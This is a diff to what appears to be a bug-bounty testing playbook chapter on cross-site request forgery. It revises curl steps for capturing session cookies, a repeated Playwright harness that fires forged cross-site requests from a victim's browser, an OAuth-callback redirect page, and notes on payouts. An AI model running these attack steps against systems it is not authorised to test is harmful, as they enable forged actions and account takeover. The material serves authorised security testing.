@@ -100,14 +100,20 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
 - **How:**
   ```bash
   D="$E/evidence/$H/CSR-001"; mkdir -p "$D"
+  # 0. which cookies carry the session: drop one at a time from B's Cookie line and see which drop breaks an authenticated read
+  CK=$(grep -i '^cookie:' "$E/accounts/B.headers" | sed -E 's/^[^:]*: *//')
+  for k in $(printf '%s' "$CK" | tr ';' '\n' | sed 's/^ *//; s/=.*//'); do
+    printf 'Cookie: %s\n' "$(printf '%s' "$CK" | tr ';' '\n' | sed 's/^ *//' | grep -v "^$k=" | paste -sd ';' -)" > "$D/without.cookie"
+    curl -sS "${HDR[@]}" -H @"$D/without.cookie" -o /dev/null -w "without $k: %{http_code}\n" "$T/api/me"; sleep 1; done
   # 1. the Set-Cookie lines that create B's session, kept next to B.headers: every CSR proof loads cookies with these attributes.
-  #    A response that re-issues the session shows them; otherwise log B in once more (field names and any login token come from login.html).
+  #    Best source: a fresh login of B (field names and any login token come from login.html); fallback: a response that re-issues them.
   curl -sS "${HDR[@]}" $B -D- -o /dev/null "$T/" | grep -i '^set-cookie' | tee "$D/any-page.set-cookie"
   curl -sS "${HDR[@]}" -c "$D/login.jar" -o "$D/login.html" "$T/login"
   curl -sS "${HDR[@]}" -b "$D/login.jar" -c "$D/login.jar" -D- -o /dev/null -X POST "$T/login" --data-urlencode 'email=<B e-mail>' \
-    --data-urlencode 'password=<B password>' | grep -i '^set-cookie' | tee "$E/accounts/B.set-cookie"
+    --data-urlencode 'password=<B password>' | grep -i '^set-cookie' | tee "$D/login.set-cookie"
+  [ -s "$D/login.set-cookie" ] && cp "$D/login.set-cookie" "$E/accounts/B.set-cookie" || cp "$D/any-page.set-cookie" "$E/accounts/B.set-cookie"
   curl -sS "${HDR[@]}" $B -o /dev/null -w 'old B session after the new login: %{http_code}\n' "$T/api/me"
-  #    not 200: the new login ended the old session; put the new values into B.headers
+  #    not 200: the new login ended the old session; put these new values into B.headers
   printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$D/login.jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')" > "$D/new-cookie.line"
   # 2. victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
   mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
@@ -118,6 +124,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   import functools, http.server, os, re, sys, tempfile, threading, time
   from playwright.sync_api import sync_playwright
   page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
+  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
   class Q(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
           return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
@@ -239,6 +246,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   import functools, http.server, os, re, sys, tempfile, threading, time
   from playwright.sync_api import sync_playwright
   page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
+  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
   class Q(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
           return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
@@ -267,7 +275,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
               f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
       c.close()
   PY
-  # 5. B's browser opens the page from another origin, once per engine, each run with its own marker
+  # 5. B's browser opens the page from another origin, once per engine, each run with its own marker (an upload action: the same loop on poc-upload.html)
   for e in chromium firefox webkit; do sed "s/csr002-csrf/csr002-$e/" "$D/poc.html" > "$D/poc-$e.html"
     python3 "$E/tools/csrf-fire.py" "poc-$e.html" "$D" $e "${HDR[@]}"
     echo "$e: $(curl -sS "${HDR[@]}" $B "$U" | grep -o "csr002-$e" || echo unchanged)"; done
@@ -342,6 +350,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   import functools, http.server, os, re, sys, tempfile, threading, time
   from playwright.sync_api import sync_playwright
   page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
+  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
   class Q(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
           return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
@@ -437,6 +446,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   import functools, http.server, os, re, sys, tempfile, threading, time
   from playwright.sync_api import sync_playwright
   page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
+  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
   class Q(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
           return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
@@ -475,8 +485,8 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   sibling host's script) and the forged change that follows; without a delivery, park it.
 - **Not a finding when:** A's token is refused on B's session: the token is bound, mark it negative. A double
   submit with no way to plant the cookie: park. Django's `csrftoken` is a double submit by design, and over HTTPS
-  Django also checks `Origin` or `Referer`, so a planted cookie alone does not pass there (#2513333 was paid as
-  low hardening). The token stays the same across logins or for the life of the session (#49974): informative
+  Django also checks `Origin` or `Referer`, so a planted cookie alone does not pass there (#2513333, $500, was
+  rated low). The token stays the same across logins or for the life of the session (#49974): informative
   unless an attacker can learn or fix it. A `__Host-` prefix on the CSRF cookie: no sibling host can set it.
 - **Escalate:** cookie planting through a CRLF `Set-Cookie` (CRL chapter), or script or a takeover on a sibling
   host that writes `document.cookie` for the parent domain (CSR-011, XSS chapter, STO chapter). Token fixation: a
@@ -500,8 +510,8 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   `match ... via: :all` or `via: [:get, :post]`, Express `app.all`, PHP code reading `$_REQUEST`, Spring
   `@RequestMapping` without `method`, ASP.NET actions without `[HttpPost]`, Django and Flask views that never look
   at the method. GraphQL mutations over GET are GQL-008.
-- **Test:** the CSRF middleware of Rails, Django, Laravel, Spring Security, ASP.NET Core and Flask-WTF skips GET
-  and HEAD as safe methods. Send the action as GET with the body moved to the query and no token; then with
+- **Test:** the CSRF checks of Rails, Django, Laravel, Spring Security, Flask-WTF and ASP.NET Core's
+  `AutoValidateAntiforgeryToken` skip GET and HEAD as safe methods. Send the action as GET with the body moved to the query and no token; then with
   `_method=POST|PUT|PATCH` in the query (custom overrides sometimes honour it on GET); then as HEAD, which some
   routers hand to the GET handler while code shaped like `if method == "GET": show() else: save()` saves. A
   top-level GET from another site carries `Lax` cookies.
@@ -525,6 +535,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   import functools, http.server, os, re, sys, tempfile, threading, time
   from playwright.sync_api import sync_playwright
   page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
+  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
   class Q(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
           return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
@@ -626,6 +637,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   import functools, http.server, os, re, sys, tempfile, threading, time
   from playwright.sync_api import sync_playwright
   page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
+  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
   class Q(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
           return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
@@ -729,6 +741,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   import functools, http.server, os, re, sys, tempfile, threading, time
   from playwright.sync_api import sync_playwright
   page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
+  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
   class Q(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
           return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
@@ -761,8 +774,8 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
     python3 "$E/tools/csrf-fire.py" "poc-$e.html" "$D" $e "${HDR[@]}"; echo "$e: $(st "csr007-$e")"; done
   cat "$D/browser.log"
   ```
-  The harness logs requests to `$T`'s host only: when the accepted URL is on another host, read `server.log` and
-  the state instead.
+  The harness logs requests to `$T`'s host only: when the accepted URL is on another host, the state read back as
+  B and the screenshot are the evidence.
 - **Proof:** the control refused on the protected route; the same action accepted on the alternate route or host
   with the cookie alone; the page that sends it from another site changing B's state, with `browser.log` and the
   cookie's `Set-Cookie` line. Name the route family and, if known, why it skips the check.
@@ -812,6 +825,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   import functools, http.server, os, re, sys, tempfile, threading, time
   from playwright.sync_api import sync_playwright
   page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
+  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
   class Q(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
           return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
@@ -910,7 +924,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   PY
   python3 "$D/capture.py" "$D" "$START"; sed -E 's/(code=)[^&]*/\1<redacted>/' "$D/callback-url.txt"; echo
   # 2. the page: B's browser navigates to the attacker's callback (a top-level GET carries Lax cookies)
-  printf '<!doctype html><title>CSR-009</title><script>location = "%s";</script>\n' "$(cat "$D/callback-url.txt")" > "$D/poc.html"
+  [ -s "$D/callback-url.txt" ] && printf '<!doctype html><title>CSR-009</title><script>location = "%s";</script>\n' "$(cat "$D/callback-url.txt")" > "$D/poc.html"
   # victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
   mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
   # csrf-fire.py <page> <evidence dir> <chromium|firefox|webkit> [the HDR arguments]
@@ -920,6 +934,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   import functools, http.server, os, re, sys, tempfile, threading, time
   from playwright.sync_api import sync_playwright
   page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
+  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
   class Q(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
           return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
@@ -953,8 +968,9 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   curl -sS "${HDR[@]}" $B "$T/settings/connections" -o "$D/B-connections.html"; grep -i -o -E '(github|google|slack)[^<]{0,80}' "$D/B-connections.html" | head
   ```
   Then, in a fresh browser with no session, use "Sign in with <provider>" with our identity and note whose account
-  opens. A provider that returns the code by `form_post` needs the callback matched by path and its POST body
-  replayed by an auto-submitting form instead of `location`.
+  opens. A callback on another host of the application needs that host's base URL in the `route` pattern. A
+  provider that returns the code by `form_post` needs the callback matched by path and its POST body replayed by
+  an auto-submitting form instead of `location`.
 - **Proof:** B's connections page listing our provider identity or workspace after B's browser loaded the page;
   from a fresh browser, "Sign in with <provider>" with our identity opening B's account (B's id), or an event
   created in B's account arriving in our workspace. Include the callback URL with the code redacted, and whether
@@ -1008,6 +1024,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   import functools, http.server, os, re, sys, tempfile, threading, time
   from playwright.sync_api import sync_playwright
   page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
+  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
   class Q(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
           return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
@@ -1036,7 +1053,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
               f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
       c.close()
   PY
-  for e in chromium firefox webkit; do python3 "$E/tools/csrf-fire.py" poc.html "$D" $e "${HDR[@]}"; done
+  for e in chromium firefox webkit; do LAXWAIT=0 python3 "$E/tools/csrf-fire.py" poc.html "$D" $e "${HDR[@]}"; done   # the login works whether B's cookie travels or not
   ls "$D"/*.png; grep '/login' "$D/browser.log"     # the screenshots show the page the browser landed on: A's account
   ```
 - **Proof:** the screenshot of B's browser showing A's account (A's name or id) after it opened the page, and
@@ -1072,8 +1089,9 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   `https://app.<registrable domain>` are the same site, so a form or a `fetch` from the first carries every cookie
   of the second, `Strict` included, while still being cross-origin (no custom header or JSON body without a
   preflight). Show that the target does not refuse a sibling `Origin`, then send the forged request from the
-  foothold. Argo CD (#2326194, $4,660, exploitable by anyone able to write HTML on the same parent domain) and
-  Grafana (CVE-2022-21703, #1466765) fell this way.
+  foothold. Argo CD (#2326194, $4,660) was exploitable by anyone able to write HTML on a page of the same parent
+  domain; the Grafana reports (#1466765, #1458236) call the same shape a cross-origin request forgery
+  (CVE-2022-21703).
 - **How:**
   ```bash
   D="$E/evidence/$H/CSR-011"; mkdir -p "$D"; U="$T/settings/profile"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
@@ -1102,6 +1120,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   import functools, http.server, os, re, sys, tempfile, threading, time
   from playwright.sync_api import sync_playwright
   page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
+  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
   class Q(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
           return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
@@ -1133,7 +1152,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   # 4. B's browser opens the foothold page (FH: its https URL on the sibling), in each engine: same-site requests are first-party everywhere
   FH='<https URL of foothold.html on the sibling host>'
   if scripts/sane scope check "$(printf '%s' "$FH" | cut -d/ -f3)"; then for e in chromium firefox webkit; do
-    python3 "$E/tools/csrf-fire.py" "$FH" "$D" $e "${HDR[@]}"; done; fi
+    LAXWAIT=0 python3 "$E/tools/csrf-fire.py" "$FH" "$D" $e "${HDR[@]}"; done; fi      # same-site: Lax and Strict travel, no wait
   curl -sS "${HDR[@]}" $B "$U" | grep -o 'csr011-csrf' || echo unchanged; grep ' POST ' "$D/browser.log"
   ```
 - **Proof:** the foothold page's URL on the sibling host and its source; `browser.log` showing the request with
@@ -1196,6 +1215,7 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   import functools, http.server, os, re, sys, tempfile, threading, time
   from playwright.sync_api import sync_playwright
   page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
+  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
   class Q(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
           return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
@@ -1244,7 +1264,8 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
 - **A missing token on an action that changes nothing that matters**: newsletter, theme, language, dismiss, add
   to cart, like, follow, mark as read (`csrf-low`). Site-wide missing tokens are one report for the whole
   application; one report per form is closed as a duplicate of the first.
-- **Login CSRF and logout CSRF** (`csrf-low`). Paid only as part of a chain (CSR-010).
+- **Login CSRF and logout CSRF** (`csrf-low`). Where login CSRF is paid alone it is rated low (#834366, $500);
+  otherwise it pays only as part of a chain (CSR-010). Logout CSRF alone is not paid.
 - **"No CSRF token in the form" or "cookie without SameSite"** with no forged change shown: a header observation
   or scanner output (`missing-headers`, `automated`).
 - **A replay with curl.** curl applies neither SameSite nor CORS. Without a page that worked in a browser it is
@@ -1262,7 +1283,8 @@ read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login C
   informative.
 - **A token that is not rotated at login or stays the same for the whole session** (#49974, $50): informative
   without a way to learn or fix it.
-- **A token readable only with a network position, or only over plain HTTP** (`mitm`).
+- **A token readable only with a network position, or only over plain HTTP** (`mitm`). #15412 was paid $1,000
+  for exactly that in 2014; programmes that list `mitm` close it today.
 - **CSRF that needs the victim to type, paste or drag** (`social-engineering`), or a click inside a framed page
   (`clickjacking`: UIR chapter).
 - **CSRF on a third-party widget or SaaS page under the domain** (`third-party`).
